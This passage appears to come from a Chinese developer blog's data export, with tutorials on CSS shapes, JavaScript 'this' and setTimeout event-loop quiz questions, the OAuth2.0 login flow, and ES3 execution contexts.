class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;title&gt;picture&lt;/title&gt;</span><br><span class=\"line\">&lt;style type=\"text/css\"&gt;</span><br><span class=\"line\">#rectangle&#123;</span><br><span class=\"line\">    background: #FFF;</span><br><span class=\"line\">    border: 10px solid #999999;</span><br><span class=\"line\">    padding:10px;</span><br><span class=\"line\">    height: 120px;</span><br><span class=\"line\">    width: 200px;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">#circle&#123;</span><br><span class=\"line\">    position:absolute;</span><br><span class=\"line\">    margin-left: 140px;</span><br><span class=\"line\">    margin-top: 10px;</span><br><span class=\"line\">    width: 40px;</span><br><span class=\"line\">    height: 40px;</span><br><span class=\"line\">    background: #999999; </span><br><span class=\"line\">    -moz-border-radius: 20px; </span><br><span class=\"line\">    -webkit-border-radius: 20px; </span><br><span class=\"line\">    border-radius: 20px;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">#triangle&#123;</span><br><span class=\"line\">    width: 0; </span><br><span class=\"line\">    height: 0; </span><br><span class=\"line\">    position:absolute;</span><br><span class=\"line\">    margin-top: 40px;</span><br><span class=\"line\">    border-bottom: 80px solid #999999; </span><br><span class=\"line\">    border-left: 50px solid transparent; </span><br><span class=\"line\">    border-right: 70px solid transparent; </span><br><span class=\"line\">&#125;</span><br><span class=\"line\">#triangle2&#123;</span><br><span class=\"line\">    width: 0; </span><br><span class=\"line\">    height: 0; </span><br><span class=\"line\">    position:absolute;</span><br><span class=\"line\">    margin-top: 60px;</span><br><span class=\"line\">    margin-left: 80px;</span><br><span class=\"line\">    border-bottom: 60px solid #999999; </span><br><span class=\"line\">    border-left: 30px solid transparent; </span><br><span class=\"line\">    border-right: 70px solid transparent; </span><br><span class=\"line\">&#125;</span><br><span class=\"line\">&lt;/style&gt;</span><br><span class=\"line\">&lt;/head&gt;</span><br><span class=\"line\">&lt;body&gt;</span><br><span class=\"line\">&lt;div id=\"rectangle\"&gt;&lt;span id=\"circle\"&gt;&lt;/span&gt;&lt;span id=\"triangle\"&gt;&lt;/span&gt;&lt;span id=\"triangle2\"&gt;&lt;/span&gt;&lt;/div&gt;</span><br><span class=\"line\">&lt;/body&gt;</span><br></pre></td></tr></table></figure>\n<h2 id=\"四、实现下述题目的要求：\"><a href=\"#四、实现下述题目的要求：\" class=\"headerlink\" title=\"四、实现下述题目的要求：\"></a>四、实现下述题目的要求：</h2><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> Obj = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">msg</span>)</span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">this</span>.msg = msg;</span><br><span class=\"line\">\t<span class=\"keyword\">this</span>.shout = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">\t\talert(<span class=\"keyword\">this</span>.msg);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">this</span>.waitAndShout = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">\t\t<span class=\"comment\">//隔五秒钟后执行上面的shout方法</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>看到此题容易以为考察setTimeout的用法，答案就写成：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> Obj = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">msg</span>)</span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">this</span>.msg = msg;</span><br><span class=\"line\">   \t<span class=\"keyword\">this</span>.shout = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">   \t\talert(<span class=\"keyword\">this</span>.msg);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">   \t<span class=\"keyword\">this</span>.waitAndShout = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">   \t\t<span class=\"comment\">//隔五秒钟后执行上面的shout方法</span></span><br><span class=\"line\">   \t\t\tsetTimeout(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">   \t\t\t\t<span class=\"keyword\">this</span>.shout();</span><br><span class=\"line\">   \t\t\t&#125;,<span class=\"number\">5000</span>);</span><br><span class=\"line\">   \t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> obj = <span class=\"keyword\">new</span> Obj(<span class=\"string\">'Jack'</span>);</span><br><span class=\"line\">obj.waitAndShout();</span><br></pre></td></tr></table></figure>\n<p>这样写是错误的，控制台会报错：<strong>Uncaught TypeError: this.shout is not a function(anonymous function) @ test.html:17</strong><br>事实上setTimeout里面的函数是个匿名函数，此时this指向window，故正确的答案:  </p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> Obj = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">msg</span>)</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.msg = msg;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.shout = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        alert(<span class=\"keyword\">this</span>.msg);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.waitAndShout = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">//隔五秒钟后执行上面的shout方法</span></span><br><span class=\"line\">        <span class=\"keyword\">var</span> self = <span class=\"keyword\">this</span>;</span><br><span class=\"line\">        setTimeout(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">            self.shout();</span><br><span class=\"line\">        &#125;,<span class=\"number\">5000</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> obj = <span class=\"keyword\">new</span> Obj(<span class=\"string\">'Jack'</span>);</span><br><span class=\"line\">obj.waitAndShout();</span><br></pre></td></tr></table></figure>\n<p>使用一个self变量来存放this，这样匿名函数就可以用self来访问Obj这个对象了，实现细节不在赘述。<br><strong>有兴趣的同学可以看:</strong> <a href=\"https://segmentfault.com/a/1190000002640298\">JavaScript中的this陷阱的最全收集–没有之一</a></p>\n<h2 id=\"五、输出下述代码的执行结果：\"><a href=\"#五、输出下述代码的执行结果：\" class=\"headerlink\" title=\"五、输出下述代码的执行结果：\"></a>五、输出下述代码的执行结果：</h2><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> start = <span class=\"keyword\">new</span> <span class=\"built_in\">Date</span>;</span><br><span class=\"line\">setTimeout(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">'fn1'</span>);</span><br><span class=\"line\">&#125;, <span class=\"number\">20</span>);</span><br><span class=\"line\">setTimeout(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">'fn2'</span>);</span><br><span class=\"line\">&#125;, <span class=\"number\">30</span>);</span><br><span class=\"line\">setTimeout(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">'another fn2'</span>);</span><br><span class=\"line\">&#125;, <span class=\"number\">30</span>);</span><br><span class=\"line\">setTimeout(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">'fn3'</span>);</span><br><span class=\"line\">&#125;, <span class=\"number\">10</span>);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">'start while'</span>);</span><br><span class=\"line\"><span class=\"keyword\">while</span> (<span class=\"keyword\">new</span> <span class=\"built_in\">Date</span> - start &lt; <span class=\"number\">1000</span>) &#123;&#125;;</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">'end while'</span>);</span><br></pre></td></tr></table></figure>\n<p>要做此题必须理解setTimeout是如何运行的, 简单来说，Javascript执行引擎运行时产生堆(Heap)和栈(Stack)。程序的代码一次进入栈中等待执行，在遇到WebAPIs中规定的事件如(DOM操作，ajax请求，还有setTimeout事件)时，会将这些事件添加到一个任务队列当中，因为Javascript是单线程执行，所以当事件时间到了之后，它先看看主线程中代码是否执行完，若代码还在执行，则阻塞该事件。  </p>\n<blockquote>\n<p>即当主线程代码还在执行的情况下会阻塞任务队列里面的事件，即使任务队列里的事件已经达到了可执行阶段 </p>\n</blockquote>\n<p>故前面几个setTimeout事件等待时间只有几十毫秒,但是new Date - start &lt; 1000代码执行阻塞了这些存放在任务队列的事件，当代码执行完毕后，这些事件会按时间顺序依次执行。故正确答案为：  </p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">start <span class=\"keyword\">while</span></span><br><span class=\"line\">end <span class=\"keyword\">while</span></span><br><span class=\"line\">fn3</span><br><span class=\"line\">fn1</span><br><span class=\"line\">fn2</span><br><span class=\"line\">another fn2</span><br></pre></td></tr></table></figure>\n<p>更详细的实现细节可以查阅: <a href=\"http://www.alloyteam.com/2015/10/turning-to-javascript-series-from-settimeout-said-the-event-loop-model/\">【转向Javascript系列】从setTimeout说事件循环模型 | Web前端 腾讯AlloyTeam  Blog | 愿景: 成为地球卓越的Web团队！</a>  </p>\n<p>明白上述题目可以试试下面这题，原理相似:</p>\n<h3 id=\"对于下列程序运行结果，符合预期的是-单选-：\"><a href=\"#对于下列程序运行结果，符合预期的是-单选-：\" class=\"headerlink\" title=\"对于下列程序运行结果，符合预期的是(单选)：\"></a>对于下列程序运行结果，符合预期的是(单选)：</h3><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">f1</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.time(<span class=\"string\">'time span'</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">f2</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.timeEnd(<span class=\"string\">'time span'</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">setTimeout(f1, <span class=\"number\">100</span>);</span><br><span class=\"line\">setTimeout(f2, <span class=\"number\">200</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">waitForMs</span>(<span class=\"params\">n</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> now = <span class=\"built_in\">Date</span>.now();</span><br><span class=\"line\">    <span class=\"keyword\">while</span> (<span class=\"built_in\">Date</span>.now() - now &lt; n) &#123;&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">waitForMs(<span class=\"number\">500</span>);</span><br></pre></td></tr></table></figure>\n<blockquote>\n<ul>\n<li>A、time span:700.077ms</li>\n<li>B、time apan:0.066ms</li>\n<li>C、time span:500.077ms</li>\n<li>D、time span:100.077ms</li>\n</ul>\n</blockquote>\n<p>正确答案：B</p>\n"},{"layout":"post","title":"第三方登录 - OAuth2.0协议","date":"2016-02-21T04:00:00.000Z","author":"Lindz","header-img":"img/4.jpg","_content":"\n> 本文为原创作品。欢迎转载，转载请注明出处：[林东洲的博客 Lindz Blog](http://www.happylindz.com)。\n\n## OAuth协议简介：\n\nOAuth协议：即为Open Authorization，我们经常在一些网站提供一些例如QQ，微博等应用的登录方式。  \n例如：\n\n![img](/assets/2016-02-21-oauth/1.png)\n\n简单说来，OAuth协议就是大公司如腾讯，阿里巴巴开放一些接口权限，可以让用户在第三方应用不知道密码的情况完成登录操作，并提供给第三方应用一些基本的信息。  \n流程图：  \n\n![img](/assets/2016-02-21-oauth/2.png)\n\n## OAuth应用场景：\n\n* QQ用户授权第三方应用如(知乎，豆瓣)使用其QQ账号相关信息。\n* 获得授权后，在符合权限规则的情况下访问各种API。(如一键分享到QQ空间)\n* 同一家公司的不同系统共享账号信息，比如阿里巴巴旗下的淘宝，支付宝，阿里云都可以使用淘宝账号进行登录。\n\n## 重要步骤解析：\n\n一、请求OAuth登录页:第三方应用请求QQ登录页面时使用的带有特定参数的URL。   \n \n例如极客学院上的请求登录页地址为：https://graph.qq.com/oauth/show?..&client_id=101119675&redirect_uri=http://passport.jikexueyuan.com/connect/success&...\n\n这个URL称之为：Request Token URL - 未授权的令牌请求服务地址\n  \n>client_id为QQ对该站点的唯一标识  \n>redirect_uri为用户登录成功后的回调地址  \n\n二、用户使用QQ号登录并授权。\n\n在用户登陆成功后，QQ在回调地址中加入了一个code参数给第三方应用。  \n比如：https://passport.jikexueyuan.com/connect/success/qqcallback?code=xxxxxx\n\n三、返回登录结果。\n\n处于安全性的考虑，需要第三方应用向令牌服务地址再次发起请求。  \n该地址称为：User Authorization URL - 用户授权的令牌请求服务地址  \n例如：https://xxx.qq.com/oauth/...?...&client_id=xxx&&...&client_secret=xxxxxxx&....&code=xxxxxx...\n\n最终成功后第三方应用获取的一个OAuth接口的令牌(AcessToken),以后第三方应用在请求QQ提供信息时就以这个令牌作为标识。","source":"_posts/2016-02-21-oauth.md","raw":"---\nlayout:     post\ntitle:      \"第三方登录 - OAuth2.0协议\"\ndate:       2016-02-21 12:00:00\nauthor:     \"Lindz\"\nheader-img: \"img/4.jpg\"\ntags:\n    - PHP\n    - 后台开发\n---\n\n> 本文为原创作品。欢迎转载，转载请注明出处：[林东洲的博客 Lindz Blog](http://www.happylindz.com)。\n\n## OAuth协议简介：\n\nOAuth协议：即为Open Authorization，我们经常在一些网站提供一些例如QQ，微博等应用的登录方式。  \n例如：\n\n![img](/assets/2016-02-21-oauth/1.png)\n\n简单说来，OAuth协议就是大公司如腾讯，阿里巴巴开放一些接口权限，可以让用户在第三方应用不知道密码的情况完成登录操作，并提供给第三方应用一些基本的信息。  \n流程图：  \n\n![img](/assets/2016-02-21-oauth/2.png)\n\n## OAuth应用场景：\n\n* QQ用户授权第三方应用如(知乎，豆瓣)使用其QQ账号相关信息。\n* 获得授权后，在符合权限规则的情况下访问各种API。(如一键分享到QQ空间)\n* 同一家公司的不同系统共享账号信息，比如阿里巴巴旗下的淘宝，支付宝，阿里云都可以使用淘宝账号进行登录。\n\n## 重要步骤解析：\n\n一、请求OAuth登录页:第三方应用请求QQ登录页面时使用的带有特定参数的URL。   \n \n例如极客学院上的请求登录页地址为：https://graph.qq.com/oauth/show?..&client_id=101119675&redirect_uri=http://passport.jikexueyuan.com/connect/success&...\n\n这个URL称之为：Request Token URL - 未授权的令牌请求服务地址\n  \n>client_id为QQ对该站点的唯一标识  \n>redirect_uri为用户登录成功后的回调地址  \n\n二、用户使用QQ号登录并授权。\n\n在用户登陆成功后，QQ在回调地址中加入了一个code参数给第三方应用。  \n比如：https://passport.jikexueyuan.com/connect/success/qqcallback?code=xxxxxx\n\n三、返回登录结果。\n\n处于安全性的考虑，需要第三方应用向令牌服务地址再次发起请求。  \n该地址称为：User Authorization URL - 用户授权的令牌请求服务地址  \n例如：https://xxx.qq.com/oauth/...?...&client_id=xxx&&...&client_secret=xxxxxxx&....&code=xxxxxx...\n\n最终成功后第三方应用获取的一个OAuth接口的令牌(AcessToken),以后第三方应用在请求QQ提供信息时就以这个令牌作为标识。","slug":"2016-02-21-oauth","published":1,"updated":"2016-03-14T13:44:30.000Z","comments":1,"photos":[],"link":"","_id":"cim4u6rwr0004xmvd55ii4d00","content":"<blockquote>\n<p>本文为原创作品。欢迎转载，转载请注明出处：<a href=\"http://www.happylindz.com\" target=\"_blank\" rel=\"external\">林东洲的博客 Lindz Blog</a>。</p>\n</blockquote>\n<h2 id=\"OAuth协议简介：\"><a href=\"#OAuth协议简介：\" class=\"headerlink\" title=\"OAuth协议简介：\"></a>OAuth协议简介：</h2><p>OAuth协议：即为Open Authorization，我们经常在一些网站提供一些例如QQ，微博等应用的登录方式。<br>例如：</p>\n<p><img src=\"/assets/2016-02-21-oauth/1.png\" alt=\"img\"></p>\n<p>简单说来，OAuth协议就是大公司如腾讯，阿里巴巴开放一些接口权限，可以让用户在第三方应用不知道密码的情况完成登录操作，并提供给第三方应用一些基本的信息。<br>流程图：  </p>\n<p><img src=\"/assets/2016-02-21-oauth/2.png\" alt=\"img\"></p>\n<h2 id=\"OAuth应用场景：\"><a href=\"#OAuth应用场景：\" class=\"headerlink\" title=\"OAuth应用场景：\"></a>OAuth应用场景：</h2><ul>\n<li>QQ用户授权第三方应用如(知乎，豆瓣)使用其QQ账号相关信息。</li>\n<li>获得授权后，在符合权限规则的情况下访问各种API。(如一键分享到QQ空间)</li>\n<li>同一家公司的不同系统共享账号信息，比如阿里巴巴旗下的淘宝，支付宝，阿里云都可以使用淘宝账号进行登录。</li>\n</ul>\n<h2 id=\"重要步骤解析：\"><a href=\"#重要步骤解析：\" class=\"headerlink\" title=\"重要步骤解析：\"></a>重要步骤解析：</h2><p>一、请求OAuth登录页:第三方应用请求QQ登录页面时使用的带有特定参数的URL。   </p>\n<p>例如极客学院上的请求登录页地址为：<a href=\"https://graph.qq.com/oauth/show?..&amp;client_id=101119675&amp;redirect_uri=http://passport.jikexueyuan.com/connect/success&amp;\" target=\"_blank\" rel=\"external\">https://graph.qq.com/oauth/show?..&amp;client_id=101119675&amp;redirect_uri=http://passport.jikexueyuan.com/connect/success&amp;</a>…</p>\n<p>这个URL称之为：Request Token URL - 未授权的令牌请求服务地址</p>\n<blockquote>\n<p>client_id为QQ对该站点的唯一标识<br>redirect_uri为用户登录成功后的回调地址  </p>\n</blockquote>\n<p>二、用户使用QQ号登录并授权。</p>\n<p>在用户登陆成功后，QQ在回调地址中加入了一个code参数给第三方应用。<br>比如：<a href=\"https://passport.jikexueyuan.com/connect/success/qqcallback?code=xxxxxx\" target=\"_blank\" rel=\"external\">https://passport.jikexueyuan.com/connect/success/qqcallback?code=xxxxxx</a></p>\n<p>三、返回登录结果。</p>\n<p>处于安全性的考虑，需要第三方应用向令牌服务地址再次发起请求。<br>该地址称为：User Authorization URL - 用户授权的令牌请求服务地址<br>例如：<a href=\"https://xxx.qq.com/oauth/...?...&amp;client_id=xxx&amp;&amp;...&amp;client_secret=xxxxxxx&amp;....&amp;code=xxxxxx\" target=\"_blank\" rel=\"external\">https://xxx.qq.com/oauth/...?...&amp;client_id=xxx&amp;&amp;...&amp;client_secret=xxxxxxx&amp;....&amp;code=xxxxxx</a>…</p>\n<p>最终成功后第三方应用获取的一个OAuth接口的令牌(AcessToken),以后第三方应用在请求QQ提供信息时就以这个令牌作为标识。</p>\n","excerpt":"","more":"<blockquote>\n<p>本文为原创作品。欢迎转载，转载请注明出处：<a href=\"http://www.happylindz.com\">林东洲的博客 Lindz Blog</a>。</p>\n</blockquote>\n<h2 id=\"OAuth协议简介：\"><a href=\"#OAuth协议简介：\" class=\"headerlink\" title=\"OAuth协议简介：\"></a>OAuth协议简介：</h2><p>OAuth协议：即为Open Authorization，我们经常在一些网站提供一些例如QQ，微博等应用的登录方式。<br>例如：</p>\n<p><img src=\"/assets/2016-02-21-oauth/1.png\" alt=\"img\"></p>\n<p>简单说来，OAuth协议就是大公司如腾讯，阿里巴巴开放一些接口权限，可以让用户在第三方应用不知道密码的情况完成登录操作，并提供给第三方应用一些基本的信息。<br>流程图：  </p>\n<p><img src=\"/assets/2016-02-21-oauth/2.png\" alt=\"img\"></p>\n<h2 id=\"OAuth应用场景：\"><a href=\"#OAuth应用场景：\" class=\"headerlink\" title=\"OAuth应用场景：\"></a>OAuth应用场景：</h2><ul>\n<li>QQ用户授权第三方应用如(知乎，豆瓣)使用其QQ账号相关信息。</li>\n<li>获得授权后，在符合权限规则的情况下访问各种API。(如一键分享到QQ空间)</li>\n<li>同一家公司的不同系统共享账号信息，比如阿里巴巴旗下的淘宝，支付宝，阿里云都可以使用淘宝账号进行登录。</li>\n</ul>\n<h2 id=\"重要步骤解析：\"><a href=\"#重要步骤解析：\" class=\"headerlink\" title=\"重要步骤解析：\"></a>重要步骤解析：</h2><p>一、请求OAuth登录页:第三方应用请求QQ登录页面时使用的带有特定参数的URL。   </p>\n<p>例如极客学院上的请求登录页地址为：<a href=\"https://graph.qq.com/oauth/show?..&amp;client_id=101119675&amp;redirect_uri=http://passport.jikexueyuan.com/connect/success&amp;\">https://graph.qq.com/oauth/show?..&amp;client_id=101119675&amp;redirect_uri=http://passport.jikexueyuan.com/connect/success&amp;</a>…</p>\n<p>这个URL称之为：Request Token URL - 未授权的令牌请求服务地址</p>\n<blockquote>\n<p>client_id为QQ对该站点的唯一标识<br>redirect_uri为用户登录成功后的回调地址  </p>\n</blockquote>\n<p>二、用户使用QQ号登录并授权。</p>\n<p>在用户登陆成功后，QQ在回调地址中加入了一个code参数给第三方应用。<br>比如：<a href=\"https://passport.jikexueyuan.com/connect/success/qqcallback?code=xxxxxx\">https://passport.jikexueyuan.com/connect/success/qqcallback?code=xxxxxx</a></p>\n<p>三、返回登录结果。</p>\n<p>处于安全性的考虑，需要第三方应用向令牌服务地址再次发起请求。<br>该地址称为：User Authorization URL - 用户授权的令牌请求服务地址<br>例如：<a href=\"https://xxx.qq.com/oauth/...?...&amp;client_id=xxx&amp;&amp;...&amp;client_secret=xxxxxxx&amp;....&amp;code=xxxxxx\">https://xxx.qq.com/oauth/...?...&amp;client_id=xxx&amp;&amp;...&amp;client_secret=xxxxxxx&amp;....&amp;code=xxxxxx</a>…</p>\n<p>最终成功后第三方应用获取的一个OAuth接口的令牌(AcessToken),以后第三方应用在请求QQ提供信息时就以这个令牌作为标识。</p>\n"},{"layout":"post","title":"Javascript - ES3执行上下文","date":"2016-02-20T04:00:00.000Z","author":"Lindz","header-img":"img/js-bg.jpg","_content":"\n> 本文为原创作品。欢迎转载，转载请注明出处：[林东洲的博客 Lindz Blog](http://www.happylindz.com)。\n\n##  概念\n\n### 一、执行上下文: (Execution Context,缩写 EC) \n\n```javascript\nconsole.log('EC0');\nfunction funcEC1(){\n    console.log('EC1');\n    function funcEC2(){\n        console.log('EC2');\n        var funcEC3 = function(){\n            console.log('EC3');\n        };\n    }\n    funcEC2();\n}\nfuncEC1();\n```\n在Javascript引擎解析上述代码时在执行函数会依次将其添加到栈（Stack）中，即(ECO(Global),EC1,EC2)，如下图所示：\n\n![Stack: ExecutionContext](/assets/2016-02-20-javascript-execution-context/1.png)\n\n执行上下文分为：全局执行上下文和函数执行上下文。\n\n### 二、变量对象：(Variable Object VO)\n是一个抽象的概念中的‘对象’，它用于存储执行上下文中的： \n\n1. 变量\n2. 函数声明\n3. 函数参数\n\n如下述代码：  \n\n```javascript\nvar a = 10;\nfunction test(x){\n    var b = 20;\n}\ntest(30);\n```\nJavascript引擎会将其解析为：  \n\n```\nVO(globalContext) = {\n\ta: 10,\n\ttest: <ref to function>\n};\nVO(test functionContext){\n    x:30,\n            b:20\n};\n```\n\n**在浏览器中全局上下文变量对象为window，而在nodejs中全局上下文变量对象为global。**\n\n**当js代码运行前**，在全局执行上下文中(浏览器)中就会默认添加一些变量，\n如：Math,String,isNaN,window，所以在调用代码时：  \n\n```javascript\nString(10);     \t\t//[[global]].String(10)\nwindow.a = 10;  \t    //[[global]].window.a = 10\nthis.b = 20; \t\t\t//[[global]].b = 20\n```\n\n### 三、函数中的激活对象：(Active Object AO)\n\n与变量对象一样，即(VO(functionContext) === AO);  \n只不过AO多了一个变量，为arguments:\n\n```javascript\narguments = {\n\tcallee,\n\tlength,\n\tproperties-indexes\n};\t\n```\n这个可选择性忽略，没什么用。\n\n## 函数调用中的执行上下文\n代码如下：\n\n```javascript\nfunction test(a, b){\n    var c = 10;\n    function d(){}\n    var e = function _e(){};\n    (function(){})();\n    b = 20;\n}\ntest(10);\n```\n\n### 1.变量初始化阶段：  \nVO按照如下顺序填充：  (在函数执行中，AO等于VO，以下都以VO简称，不再赘述)  \n\n1. 函数参数(若未传入，初始化该参数值为undefined)\n> 这里说一下，未声明的变量和声明为undefined变量是有区别的:用alert未声明的变量会报错：ReferenceError: Can't find variable，而alert声明为undefined变量会显示undefined。\n> \n> 然而如果以属性的是形式访问的话，比如window.variable，alert未声明的属性或者声明为undefined的属性都弹出undefined.\n\n2. 函数声明 (若发生命名冲突，会覆盖之前的函数参数)\n3. 变量声明 (初始化变量值为undefined，若发生命名冲突，会忽略)  \n\n所以在执行到test(10)时，函数执行上下文变量初始化阶段为：\n\n```javascript\nVO(test) = {\n\ta:10,\n\tb:undefined,\n\tc:undefined,\n\td:<ref to func 'd'>,\n\te:undefined\n}\t\t\n```\n\n理解：首先添加函数参数，因为传入10，所以a:10而b：20，之后函数声明提升，d被添加VO，并指向func d，之后就是变量声明提升，c、e被依次添加到AO中。\n\n> 注意变量d和变量e的不同，d是函数声明而e是指向函数表达式，所以在变量初始化阶段时，d已经指向函数地址，而e被赋值必须要等到执行到e = function _e(){}代码的时候\n\n注意：函数表达式并不会影响VO；\n\n> 注意到函数_e还有下一行代码函数(function(){})(),它们都是函数表达式，所以并不会被添加到VO变量对象里。\n\n讲到这是不是觉得自己已经弄懂了，下面还有阐述一些细节的东西： \n\n* 函数声明命名冲突时覆盖函数形参:\n\n```javascript\nfunction foo(x,y,z){\n\tfunction x(){};\n\tconsole.log(x);\n}\nfoo(100);\n```\n输出结果：function (){}，因为命名冲突时函数声明命名会覆盖函数形参。\n\n* 变量声明命名冲突时不会覆盖函数形参或者函数声明：\n\n```javascript\nfunction foo(x, y, z){\n\tfunction func(){\n\t\t\t\n\t};\n\tvar func;\n\tconsole.log(func);\n}\nfunc();\n```\n输出结果：function func(){},理由如上。\n\n### 2.代码执行阶段： \n \n```javascript\nVO(test) = {\n\ta: 10,\n\tb: 20,\n\tc: 10,\n\td: <ref to func 'd'>,\n\te: function _e(){};\n};\n``` \n \n附赠一题练习题：\n\n```javascript\t\nconsole.log(x);\nvar x = 10;\n\nconsole.log(x);\nx = 20;\n\nfunction x(){}\nconsole.log(x);\n\nif(true){\n    var a = 1;\n}else{\n    var b = 